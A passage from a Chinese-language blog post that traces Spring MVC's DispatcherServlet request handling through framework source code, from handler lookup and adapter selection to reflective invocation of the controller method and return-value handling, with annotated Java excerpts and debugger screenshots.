? config.combine(handlerConfig) : handlerConfig;</span><br><span class="line">            <span class="comment">// 获取CORS处理器的执行链</span></span><br><span class="line">            executionChain = <span class="built_in">this</span>.getCorsHandlerExecutionChain(request, executionChain, config);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> executionChain;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的mapping是RequestMappingInfoHandlerMapping类，进入getHandlerInternal方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> HandlerMethod <span class="title function_">getHandlerInternal</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    request.removeAttribute(PRODUCIBLE_MEDIA_TYPES_ATTRIBUTE);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.getHandlerInternal(request);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        ProducesRequestCondition.clearMediaTypesAttribute(request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用父类即AbstractHandlerMethodMapping类的getHandlerInternal方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> HandlerMethod <span class="title function_">getHandlerInternal</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 获取请求的查找路径</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">lookupPath</span> <span class="operator">=</span> getUrlPathHelper().getLookupPathForRequest(request);</span><br><span class="line">    request.setAttribute(LOOKUP_PATH, lookupPath);</span><br><span class="line">    <span class="built_in">this</span>.mappingRegistry.acquireReadLock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 据查找路径和请求对象查找匹配的处理器方法</span></span><br><span class="line">        <span class="type">HandlerMethod</span> <span class="variable">handlerMethod</span> <span class="operator">=</span> lookupHandlerMethod(lookupPath, request);</span><br><span class="line">        <span class="comment">// 如果找到了匹配的处理器方法，则调用createWithResolvedBean方法创建一个包含已解析的Bean的HandlerMethod对象，并返回该对象</span></span><br><span class="line">        <span class="keyword">return</span> (handlerMethod != <span class="literal">null</span> ? handlerMethod.createWithResolvedBean() : <span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.mappingRegistry.releaseReadLock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入lookupHandlerMethod方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">protected</span> HandlerMethod <span class="title function_">lookupHandlerMethod</span><span class="params">(String lookupPath, HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 创建一个空的Match对象列表</span></span><br><span class="line">    List&lt;Match&gt; matches = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 根据查找路径从映射注册表中获取直接路径匹配的映射列表</span></span><br><span class="line">    List&lt;T&gt; directPathMatches = <span class="built_in">this</span>.mappingRegistry.getMappingsByUrl(lookupPath);</span><br><span class="line">    <span class="keyword">if</span> (directPathMatches != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 将直接路径匹配的映射列表与请求对象进行匹配，并将匹配结果添加到matches列表中</span></span><br><span class="line">        addMatchingMappings(directPathMatches, matches, request);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (matches.isEmpty()) &#123;</span><br><span class="line">        <span class="comment">// 无法直接使用uri进行匹配，有下面三种情况</span></span><br><span class="line">        <span class="comment">// RequestMapping中定义的是PathVariable，如/user/detail/&#123;id&#125;</span></span><br><span class="line">        <span class="comment">// RequestMapping中定义了问号表达式，如/user/?detail</span></span><br><span class="line">        <span class="comment">// RequestMapping中定义了*或**匹配，如/user/detail/**</span></span><br><span class="line">        <span class="comment">// No choice but to go through all mappings...</span></span><br><span class="line">        addMatchingMappings(<span class="built_in">this</span>.mappingRegistry.getMappings().keySet(), matches, request);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 存在匹配结果</span></span><br><span class="line">    <span class="keyword">if</span> (!matches.isEmpty()) &#123;</span><br><span class="line">        <span class="type">Match</span> <span class="variable">bestMatch</span> <span class="operator">=</span> matches.get(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (matches.size() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// 生成比较器，对匹配结果进行排序</span></span><br><span class="line">            Comparator&lt;Match&gt; comparator = <span class="keyword">new</span> <span class="title class_">MatchComparator</span>(getMappingComparator(request));</span><br><span class="line">            matches.sort(comparator);</span><br><span class="line">            <span class="comment">// 获取匹配程度最高的结果</span></span><br><span class="line">            bestMatch = matches.get(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">                logger.trace(matches.size() + <span class="string">&quot; matching mappings: &quot;</span> + matches);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (CorsUtils.isPreFlightRequest(request)) &#123;</span><br><span class="line">                <span class="keyword">return</span> PREFLIGHT_AMBIGUOUS_MATCH;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 比较前后两个相似度是否一致</span></span><br><span class="line">            <span class="type">Match</span> <span class="variable">secondBestMatch</span> <span class="operator">=</span> matches.get(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(bestMatch, secondBestMatch) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">m1</span> <span class="operator">=</span> bestMatch.handlerMethod.getMethod();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">m2</span> <span class="operator">=</span> secondBestMatch.handlerMethod.getMethod();</span><br><span class="line">                <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> request.getRequestURI();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">                        <span class="string">&quot;Ambiguous handler methods mapped for &#x27;&quot;</span> + uri + <span class="string">&quot;&#x27;: &#123;&quot;</span> + m1 + <span class="string">&quot;, &quot;</span> + m2 + <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        request.setAttribute(BEST_MATCHING_HANDLER_ATTRIBUTE, bestMatch.handlerMethod);</span><br><span class="line">        <span class="comment">// 对匹配结果的处理</span></span><br><span class="line">        handleMatch(bestMatch.mapping, lookupPath, request);</span><br><span class="line">        <span class="keyword">return</span> bestMatch.handlerMethod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> handleNoMatch(<span class="built_in">this</span>.mappingRegistry.getMappings().keySet(), lookupPath, request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入addMatchingMappings方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">addMatchingMappings</span><span class="params">(Collection&lt;T&gt; mappings, List&lt;Match&gt; matches, HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (T mapping : mappings) &#123;</span><br><span class="line">        <span class="comment">// 将当前映射和请求对象传递给它，以获取匹配的映射</span></span><br><span class="line">        <span class="type">T</span> <span class="variable">match</span> <span class="operator">=</span> getMatchingMapping(mapping, request);</span><br><span class="line">        <span class="keyword">if</span> (match != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 创建一个Match对象，将匹配的映射和原始映射添加到matches列表中。Match对象是一个自定义对象，用于存储匹配的映射和对应的处理器方法</span></span><br><span class="line">            matches.add(<span class="keyword">new</span> <span class="title class_">Match</span>(match, <span class="built_in">this</span>.mappingRegistry.getMappings().get(mapping)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230915144552.png"><br>lookupHandlerMethod方法执行到最后的结果<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230915144809.png"><br>getHandlerInternal方法执行到最后<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230915150443.png"><br>getHandler方法执行到最后<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230915150635.png"><br>获取到handler后，回到doDispatch函数，执行下面这行代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HandlerAdapter</span> <span class="variable">ha</span> <span class="operator">=</span> getHandlerAdapter(mappedHandler.getHandler());</span><br></pre></td></tr></table></figure>

<p>进入getHandlerAdapter方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 根据处理程序的类型选择合适的HandlerAdapter</span></span><br><span class="line"><span class="keyword">protected</span> HandlerAdapter <span class="title function_">getHandlerAdapter</span><span class="params">(Object handler)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.handlerAdapters != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (HandlerAdapter adapter : <span class="built_in">this</span>.handlerAdapters) &#123;</span><br><span class="line">            <span class="comment">// 检查是否支持给定的处理程序</span></span><br><span class="line">            <span class="keyword">if</span> (adapter.supports(handler)) &#123;</span><br><span class="line">                <span class="keyword">return</span> adapter;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(<span class="string">&quot;No adapter for handler [&quot;</span> + handler +</span><br><span class="line">            <span class="string">&quot;]: The DispatcherServlet configuration needs to include a HandlerAdapter that supports this handler&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>HandlerAdapter的作用是将具体的处理程序（handler）与Spring MVC框架进行适配，以便能够正确处理请求并生成响应。它扮演了一个桥梁的角色，连接了处理程序和框架的其他组件。包括处理程序适配、参数解析与绑定、处理程序执行、异常处理等</strong><br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230915170851.png"><br>继续返回doDispatch函数，执行下面代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入applyPreHandle方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在请求到达处理程序之前执行一系列预处理拦截器的逻辑，并根据拦截器的返回结果来决定是否继续处理该请求</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">applyPreHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 获取配置的拦截器数组</span></span><br><span class="line">    HandlerInterceptor[] interceptors = getInterceptors();</span><br><span class="line">    <span class="keyword">if</span> (!ObjectUtils.isEmpty(interceptors)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; interceptors.length; i++) &#123;</span><br><span class="line">            <span class="type">HandlerInterceptor</span> <span class="variable">interceptor</span> <span class="operator">=</span> interceptors[i];</span><br><span class="line">            <span class="comment">// 如果preHandle方法返回false，表示拦截器拦截了请求，不允许继续处理</span></span><br><span class="line">            <span class="keyword">if</span> (!interceptor.preHandle(request, response, <span class="built_in">this</span>.handler)) &#123;</span><br><span class="line">                triggerAfterCompletion(request, response, <span class="literal">null</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果preHandle方法返回true，表示拦截器允许请求继续处理。同时，将当前拦截器的索引（interceptorIndex）记录下来，以便在请求处理完成后应用后处理拦截器</span></span><br><span class="line">            <span class="built_in">this</span>.interceptorIndex = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230915195247.png"><br>回到doDispatch函数，执行下面代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mv = ha.handle(processedRequest, response, mappedHandler.getHandler());</span><br></pre></td></tr></table></figure>

<p>AbstractHandlerMethodAdapter.java的handle方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> ModelAndView <span class="title function_">handle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span></span><br><span class="line">        <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> handleInternal(request, response, (HandlerMethod) handler);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据上面的程序可以直到ha是RequestMappingHandlerAdapter对象，进入handleInternal方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> ModelAndView <span class="title function_">handleInternal</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">        HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    ModelAndView mav;</span><br><span class="line">    <span class="comment">// 对请求进行检查（checkRequest），确保请求的有效性</span></span><br><span class="line">    checkRequest(request);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否在会话（session）上进行同步操作</span></span><br><span class="line">    <span class="comment">// Execute invokeHandlerMethod in synchronized block if required.</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.synchronizeOnSession) &#123;</span><br><span class="line">        <span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession(<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (session != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">mutex</span> <span class="operator">=</span> WebUtils.getSessionMutex(session);</span><br><span class="line">            <span class="keyword">synchronized</span> (mutex) &#123;</span><br><span class="line">                mav = invokeHandlerMethod(request, response, handlerMethod);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// No HttpSession available -&gt; no mutex necessary</span></span><br><span class="line">            mav = invokeHandlerMethod(request, response, handlerMethod);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// No synchronization on session demanded at all...</span></span><br><span class="line">        <span class="comment">// 这里</span></span><br><span class="line">        mav = invokeHandlerMethod(request, response, handlerMethod);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!response.containsHeader(HEADER_CACHE_CONTROL)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (getSessionAttributesHandler(handlerMethod).hasSessionAttributes()) &#123;</span><br><span class="line">            applyCacheSeconds(response, <span class="built_in">this</span>.cacheSecondsForSessionAttributeHandlers);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            prepareResponse(response);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mav;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入invokeHandlerMethod</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 执行handlerMethod，然后返回ModelAndView对象</span></span><br><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">protected</span> ModelAndView <span class="title function_">invokeHandlerMethod</span><span class="params">(HttpServletRequest request,</span></span><br><span class="line"><span class="params">        HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 用于封装请求和响应对象</span></span><br><span class="line">    <span class="type">ServletWebRequest</span> <span class="variable">webRequest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletWebRequest</span>(request, response);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 创建数据绑定工厂和模型工厂，用于处理方法参数的绑定和模型的创建</span></span><br><span class="line">        <span class="type">WebDataBinderFactory</span> <span class="variable">binderFactory</span> <span class="operator">=</span> getDataBinderFactory(handlerMethod);</span><br><span class="line">        <span class="type">ModelFactory</span> <span class="variable">modelFactory</span> <span class="operator">=</span> getModelFactory(handlerMethod, binderFactory);</span><br><span class="line">        <span class="comment">// 用于调用处理方法。设置参数解析器、返回值处理器、数据绑定工厂和参数名称发现者等</span></span><br><span class="line">        <span class="type">ServletInvocableHandlerMethod</span> <span class="variable">invocableMethod</span> <span class="operator">=</span> createInvocableHandlerMethod(handlerMethod);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.argumentResolvers != <span class="literal">null</span>) &#123;</span><br><span class="line">            invocableMethod.setHandlerMethodArgumentResolvers(<span class="built_in">this</span>.argumentResolvers);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.returnValueHandlers != <span class="literal">null</span>) &#123;</span><br><span class="line">            invocableMethod.setHandlerMethodReturnValueHandlers(<span class="built_in">this</span>.returnValueHandlers);</span><br><span class="line">        &#125;</span><br><span class="line">        invocableMethod.setDataBinderFactory(binderFactory);</span><br><span class="line">        invocableMethod.setParameterNameDiscoverer(<span class="built_in">this</span>.parameterNameDiscoverer);</span><br><span class="line">        <span class="comment">// 用于保存模型和视图</span></span><br><span class="line">        <span class="type">ModelAndViewContainer</span> <span class="variable">mavContainer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndViewContainer</span>();</span><br><span class="line">        mavContainer.addAllAttributes(RequestContextUtils.getInputFlashMap(request));</span><br><span class="line">        modelFactory.initModel(webRequest, mavContainer, invocableMethod);</span><br><span class="line">        mavContainer.setIgnoreDefaultModelOnRedirect(<span class="built_in">this</span>.ignoreDefaultModelOnRedirect);</span><br><span class="line">        <span class="comment">// 创建异步请求对象 AsyncWebRequest，设置超时时间</span></span><br><span class="line">        <span class="type">AsyncWebRequest</span> <span class="variable">asyncWebRequest</span> <span class="operator">=</span> WebAsyncUtils.createAsyncWebRequest(request, response);</span><br><span class="line">        asyncWebRequest.setTimeout(<span class="built_in">this</span>.asyncRequestTimeout);</span><br><span class="line">        <span class="comment">// 获取或创建异步管理器 WebAsyncManager，设置任务执行器、异步请求对象和拦截器</span></span><br><span class="line">        <span class="type">WebAsyncManager</span> <span class="variable">asyncManager</span> <span class="operator">=</span> WebAsyncUtils.getAsyncManager(request);</span><br><span class="line">        asyncManager.setTaskExecutor(<span class="built_in">this</span>.taskExecutor);</span><br><span class="line">        asyncManager.setAsyncWebRequest(asyncWebRequest);</span><br><span class="line">        asyncManager.registerCallableInterceptors(<span class="built_in">this</span>.callableInterceptors);</span><br><span class="line">        asyncManager.registerDeferredResultInterceptors(<span class="built_in">this</span>.deferredResultInterceptors);</span><br><span class="line">        <span class="comment">// 如果是异步请求，调用startCallableProcessing方法，启动异步处理</span></span><br><span class="line">        <span class="keyword">if</span> (asyncManager.hasConcurrentResult()) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> asyncManager.getConcurrentResult();</span><br><span class="line">            mavContainer = (ModelAndViewContainer) asyncManager.getConcurrentResultContext()[<span class="number">0</span>];</span><br><span class="line">            asyncManager.clearConcurrentResult();</span><br><span class="line">            LogFormatUtils.traceDebug(logger, traceOn -&gt; &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">formatted</span> <span class="operator">=</span> LogFormatUtils.formatValue(result, !traceOn);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Resume with async result [&quot;</span> + formatted + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">            &#125;);</span><br><span class="line">            invocableMethod = invocableMethod.wrapConcurrentResult(result);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 调用处理方法</span></span><br><span class="line">        <span class="comment">// 这里</span></span><br><span class="line">        invocableMethod.invokeAndHandle(webRequest, mavContainer);</span><br><span class="line">        <span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 如果处理方法返回的是null，或者ModelAndViewContainer中的视图名称为null，则直接返回null</span></span><br><span class="line">        <span class="keyword">return</span> getModelAndView(mavContainer, modelFactory, webRequest);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        webRequest.requestCompleted();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230915202111.png"><br>进入invokeAndHandle方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invokeAndHandle</span><span class="params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer,</span></span><br><span class="line"><span class="params">        Object... providedArgs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 执行处理方法，获取处理方法的返回值</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">returnValue</span> <span class="operator">=</span> invokeForRequest(webRequest, mavContainer, providedArgs);</span><br><span class="line">    setResponseStatus(webRequest);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (returnValue == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isRequestNotModified(webRequest) || getResponseStatus() != <span class="literal">null</span> || mavContainer.isRequestHandled()) &#123;</span><br><span class="line">            disableContentCachingIfNecessary(webRequest);</span><br><span class="line">            mavContainer.setRequestHandled(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (StringUtils.hasText(getResponseStatusReason())) &#123;</span><br><span class="line">        mavContainer.setRequestHandled(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mavContainer.setRequestHandled(<span class="literal">false</span>);</span><br><span class="line">    Assert.state(<span class="built_in">this</span>.returnValueHandlers != <span class="literal">null</span>, <span class="string">&quot;No return value handlers&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.returnValueHandlers.handleReturnValue(</span><br><span class="line">                returnValue, getReturnValueType(returnValue), mavContainer, webRequest);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</span><br><span class="line">            logger.trace(formatErrorForReturnValue(returnValue), ex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入invokeForRequest方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invokeForRequest</span><span class="params">(NativeWebRequest request, <span class="meta">@Nullable</span> ModelAndViewContainer mavContainer, Object... providedArgs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Object[] args = <span class="built_in">this</span>.getMethodArgumentValues(request, mavContainer, providedArgs);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.logger.isTraceEnabled()) &#123;</span><br><span class="line">        <span class="built_in">this</span>.logger.trace(<span class="string">&quot;Arguments: &quot;</span> + Arrays.toString(args));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这里</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.doInvoke(args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230915203011.png"><br>进入doInvoke方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">doInvoke</span><span class="params">(Object... args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    ReflectionUtils.makeAccessible(<span class="built_in">this</span>.getBridgedMethod());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 这里</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getBridgedMethod().invoke(<span class="built_in">this</span>.getBean(), args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var4) &#123;</span><br><span class="line">        <span class="built_in">this</span>.assertTargetBean(<span class="built_in">this</span>.getBridgedMethod(), <span class="built_in">this</span>.getBean(), args);</span><br><span class="line">        <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> var4.getMessage() != <span class="literal">null</span> ? var4.getMessage() : <span class="string">&quot;Illegal argument&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="built_in">this</span>.formatInvokeError(text, args), var4);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException var5) &#123;</span><br><span class="line">        <span class="type">Throwable</span> <span class="variable">targetException</span> <span class="operator">=</span> var5.getTargetException();</span><br><span class="line">        <span class="keyword">if</span> (targetException <span class="keyword">instanceof</span> RuntimeException) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (RuntimeException)targetException;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (targetException <span class="keyword">instanceof</span> Error) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (Error)targetException;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (targetException <span class="keyword">instanceof</span> Exception) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (Exception)targetException;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="built_in">this</span>.formatInvokeError(<span class="string">&quot;Invocation failure&quot;</span>, args), targetException);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>采用反射的方式调用目标控制方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230915203940.png"><br>最终来到了自己编写的控制方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230915204131.png"><br>回到invokeAndHandle方法，执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="built_in">this</span>.returnValueHandlers.handleReturnValue(</span><br><span class="line">    returnValue, getReturnValueType(returnValue), mavContainer, webRequest);</span><br></pre></td></tr></table></figure>

<p>进入HandlerMethodReturnValueHandlerComposite.class的handleReturnValue方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleReturnValue</span><span class="params">(<span class="meta">@Nullable</span> Object returnValue, MethodParameter returnType, ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 选择适当的返回值处理器</span></span><br><span class="line">    <span class="type">HandlerMethodReturnValueHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="built_in">this</span>.selectHandler(returnValue, returnType);</span><br><span class="line">    <span class="keyword">if</span> (handler == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Unknown return value type: &quot;</span> + returnType.getParameterType().getName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 调用所选处理器的 handleReturnValue 方法处理返回值</span></span><br><span class="line">        handler.handleReturnValue(returnValue, returnType, mavContainer, webRequest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

